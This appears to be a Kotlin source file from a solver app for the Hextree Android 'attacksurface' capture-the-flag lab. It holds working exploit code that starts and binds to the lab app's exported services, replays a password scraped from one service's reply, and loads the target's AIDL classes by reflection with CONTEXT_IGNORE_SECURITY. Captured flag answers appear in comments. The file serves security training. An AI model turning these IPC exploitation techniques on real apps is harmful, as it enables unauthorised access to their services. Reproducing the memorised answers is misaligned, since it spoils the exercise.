package com.example.hetreepoc

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.os.Parcelable
import android.os.RemoteException
import android.util.Log
import android.widget.Button
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import io.hextree.attacksurface.services.IFlag28Interface

class ServiceSolver : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_service_solver)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val flag24Button: Button = findViewById(R.id.flag24Button)
        flag24Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag24Service"
            )
            intent.action = "io.hextree.services.START_FLAG24_SERVICE"
            startService(intent)
        }

        val flag25Button: Button = findViewById(R.id.flag25Button)
        var flag25Counter = 0
        flag25Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag25Service"
            )
            val lock = (flag25Counter++ % 3) + 1
            intent.action = "io.hextree.services.UNLOCK$lock"
            startService(intent)
        }

        val flag26Button: Button = findViewById(R.id.flag26Button)
        flag26Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag26Service"
            )
            val boundService = object : ServiceConnection {
                override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                    val serviceMessenger = Messenger(service)
                    val msg = Message.obtain(null, 42)
                    serviceMessenger.send(msg)
                }

                override fun onServiceDisconnected(name: ComponentName?) { }
            }
            bindService(intent, boundService, BIND_AUTO_CREATE)
        }

        val flag27Button: Button = findViewById(R.id.flag27Button)
        flag27Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag27Service"
            )
            bindService(intent, object : ServiceConnection {
                override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                    val serviceMessenger = Messenger(service)
                    val msg1 = Message.obtain(null, 1)
                    msg1.data.putString("echo", "give flag")
                    serviceMessenger.send(msg1)

                    val msg2 = Message.obtain(null, 2)
                    msg2.obj = Message()
                    msg2.replyTo = Messenger(object : Handler(Looper.getMainLooper()) {
                        override fun handleMessage(reply: Message) {
                            super.handleMessage(reply)
                            val password = reply.data.getString("password")
                            val replyStr = reply.data.getString("reply")
                            Log.i(ServiceSolver::class.java.name, "$reply\npassword: $password, replyStr: $replyStr")
                            if (password != null) {
                                val msg3 = Message.obtain(null, 3)
                                msg3.data = Bundle().also { it.putString("password", password) }
                                msg3.replyTo = Messenger(Handler(Looper.getMainLooper())) // ignore reply as it has no flag.
                                serviceMessenger.send(msg3)
                            }
                        }
                    })
                    serviceMessenger.send(msg2)
                }

                override fun onServiceDisconnected(name: ComponentName?) { }
            }, BIND_AUTO_CREATE)
        }

        val flag28Button: Button = findViewById(R.id.flag28Button)
        flag28Button.setOnClickListener {
            var aidlService: IFlag28Interface? = null
            val aidlServiceConnection = object : ServiceConnection {

                override fun onServiceConnected(className: ComponentName, service: IBinder) {
                    // This is called when the connection with the service is
                    // established, giving us the service object we can use to
                    // interact with the service.  We are communicating with the
                    // service through an AIDL interface, so get a client-side
                    // representation of that from the raw service object.
                    Log.i("aidlServiceConnection", "onServiceConnected")
                    aidlService = IFlag28Interface.Stub.asInterface(service)
                    val res = aidlService?.openFlag()
                    Log.i("aidlServiceConnection", "openFlag result: $res")
                }

                override fun onServiceDisconnected(className: ComponentName) {
                    // This is called when the connection with the service is
                    // unexpectedly disconnected - that is, its process crashed.
                    Log.i("aidlServiceConnection", "onServiceDisconnected")
                    aidlService = null
                }
            }

            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag28Service"
            )
            bindService(intent, aidlServiceConnection, BIND_AUTO_CREATE) //HXT{bound-aidl-service-sdf2ds}
        }

        val flag29Button: Button = findViewById(R.id.flag29Button)
        flag29Button.setOnClickListener {
            val aidlServiceConnection = object : ServiceConnection {
                override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                    Log.i("aidlServiceConnection", "onServiceConnected")
                    /*
                    //Way 1:
                    Log.i("aidlServiceConnection", "Way 1")
                    val aidlService = io.hextree.attacksurface.services.IFlag29Interface.Stub.asInterface(service)
                    val pw = aidlService.init()
                    Log.i("aidlServiceConnection", "password: $pw")
                    aidlService.authenticate(pw)
                    aidlService.success()
                     */

                    //Way2
                    Log.i("aidlServiceConnection", "Way 2")
                    val remoteClassLoader = createPackageContext(
                        "io.hextree.attacksurface",
                        Context.CONTEXT_INCLUDE_CODE or Context.CONTEXT_IGNORE_SECURITY
                    ).classLoader

                    val remoteInterfaceClass     = remoteClassLoader.loadClass("io.hextree.attacksurface.services.IFlag29Interface") // DESCRIPTOR variable inside the interface
                    val remoteInterfaceStubClass = remoteClassLoader.loadClass("io.hextree.attacksurface.services.IFlag29Interface\$Stub")
                    val asInterfaceMethod = remoteInterfaceStubClass.getMethod("asInterface", IBinder::class.java)

                    val aidlService = asInterfaceMethod.invoke(null, service) // <==> io.hextree.attacksurface.services.IFlag29Interface.Stub.asInterface(service)
                    val initMethod = aidlService.javaClass.getDeclaredMethod("init")
                    val authenticateMethod = aidlService.javaClass.getDeclaredMethod("authenticate", String::class.java)
                    val successMethod = aidlService.javaClass.getDeclaredMethod("success")

                    val pw = initMethod.invoke(aidlService) as String
                    Log.i("aidlServiceConnection", "password: $pw")
                    authenticateMethod.invoke(aidlService, pw)
                    successMethod.invoke(aidlService)
                }

                override fun onServiceDisconnected(name: ComponentName?) {
                    Log.i("aidlServiceConnection", "onServiceDisconnected")
                }
            }
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag29Service"
            )
            bindService(intent, aidlServiceConnection, BIND_AUTO_CREATE) //HXT{ai-ai-aidl-service-a2si1}
        }
    }
}
